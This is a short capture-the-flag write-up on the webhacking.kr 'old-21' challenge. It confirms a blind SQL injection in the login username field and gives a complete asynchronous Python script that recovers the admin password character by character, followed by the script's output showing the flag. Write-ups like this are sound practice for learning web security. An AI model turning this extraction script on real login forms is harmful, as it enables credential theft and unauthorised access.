# Old 21    SQLi (Blind Extract Password)

URL: [https://webhacking.kr/challenge/bonus-1/](https://webhacking.kr/challenge/bonus-1/)

![old-21.png](/assets/ctf/webhacking.kr/old-21.png)

By the looks of it we should perform Blind SQLi.

Trying the basic bypass gives us `wrong password` instead of `login fail` with valid username.

![old-21-1.png](/assets/ctf/webhacking.kr/old-21-1.png)

Username injection is confirmed, now we need to get password.

```python
from aiohttp import ClientSession
import asyncio
import string

URL = 'https://webhacking.kr/challenge/bonus-1/index.php'
CHARSET = string.ascii_letters + string.digits + '{}!?,_'
PAYLOAD = "admin' AND SUBSTRING(pw,{},1)='{}' -- -"

async def fetch(session, search):
    async with session.get(URL, params={'id': search, 'pw': 'uwu'}) as resp:
        text = await resp.text()
        if 'wrong password' in text:
            return True
        else:
            return False

async def main():
    password = ''
    password_i = len(password) + 1
    async with ClientSession() as session:
        while True:
            tasks = [
                fetch(session, PAYLOAD.format(password_i, c))
                for c in CHARSET
            ]
            print(f'\r[{password_i}] {password}', end='')
            results = await asyncio.gather(*tasks)
            for i, result in enumerate(results):
                if result:
                    password += CHARSET[i]
                    password_i += 1
                    break
            else:
                print(f'\r[Password] {password}')
                break

if __name__ == '__main__':
    asyncio.run(main())
```

```powershell
➜ py .\old-21.py
[Flag] there_is_no_rest_for_the_white_angel
```

Login with credentials and pwn the room.

![old-21-2.png](/assets/ctf/webhacking.kr/old-21-2.png)